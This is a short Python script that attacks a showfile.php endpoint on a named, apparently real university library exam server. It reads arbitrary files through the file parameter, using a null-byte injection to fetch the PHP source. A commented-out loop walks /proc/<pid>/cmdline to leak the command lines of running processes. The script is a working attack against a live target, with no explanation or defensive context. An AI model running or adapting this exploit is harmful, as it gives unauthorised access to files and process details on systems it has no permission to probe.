#!/usr/bin/env python3
#-*- coding: utf8 -*-
from urllib.parse   import quote
from urllib.request import urlopen

#for i in range(1000,3000):
#    leak = urlopen('http://exam.lib.ncku.edu.tw/showfile.php?file=/proc/'+str(i)+'/cmdline').read()
#    if leak != '':
#        print(i,leak)

print(urlopen('http://exam.lib.ncku.edu.tw/showfile.php?file=showfile.php'+chr(0)).read())
